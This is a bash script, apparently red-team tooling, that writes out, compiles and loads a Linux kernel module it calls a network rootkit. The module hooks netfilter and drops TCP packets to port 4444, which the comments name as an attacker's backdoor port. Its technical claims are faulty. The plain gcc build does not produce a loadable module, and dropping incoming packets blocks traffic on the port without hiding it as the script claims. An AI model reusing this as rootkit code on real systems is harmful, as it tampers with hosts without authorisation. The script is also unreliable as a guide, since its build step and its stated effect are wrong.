#!/bin/bash

# Red Team - Network Traffic Manipulation Rootkit

KERNEL_MODULE_SRC="/tmp/netrootkit.c"

# Kernel module source code for traffic manipulation
cat << 'EOF' > $KERNEL_MODULE_SRC
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/skbuff.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/udp.h>

static struct nf_hook_ops netfilter_ops;

unsigned int main_hook(void *priv, struct sk_buff *skb, const struct nf_hook_state *state) {
    struct iphdr *iph;
    struct tcphdr *tcph;

    iph = ip_hdr(skb);
    if (iph->protocol == IPPROTO_TCP) {
        tcph = tcp_hdr(skb);

        // Check if the destination port is the attacker's backdoor port
        if (ntohs(tcph->dest) == 4444) {
            // Hide or manipulate traffic going to the backdoor port
            printk(KERN_INFO "Intercepted traffic to backdoor port. Dropping packet.\n");
            return NF_DROP;  // Drop the packet, hiding it from network tools
        }
    }

    return NF_ACCEPT;
}

static int __init netrootkit_init(void) {
    netfilter_ops.hook = main_hook;
    netfilter_ops.pf = PF_INET;
    netfilter_ops.hooknum = NF_INET_PRE_ROUTING;
    netfilter_ops.priority = NF_IP_PRI_FIRST;

    nf_register_net_hook(&init_net, &netfilter_ops);
    printk(KERN_INFO "Network rootkit loaded.\n");
    return 0;
}

static void __exit netrootkit_exit(void) {
    nf_unregister_net_hook(&init_net, &netfilter_ops);
    printk(KERN_INFO "Network rootkit unloaded.\n");
}

module_init(netrootkit_init);
module_exit(netrootkit_exit);

MODULE_LICENSE("GPL");
EOF

# Compile the kernel module
echo "[+] Compiling network rootkit..."
gcc -o /tmp/netrootkit.ko -nostdinc -isystem /usr/lib/modules/$(uname -r)/build/include -include /usr/include/linux/kconfig.h -D__KERNEL__ -DMODULE $KERNEL_MODULE_SRC

# Insert the network rootkit module
echo "[+] Loading network rootkit module..."
insmod /tmp/netrootkit.ko

echo "[+] Network traffic manipulation is active. Traffic on port 4444 is now hidden."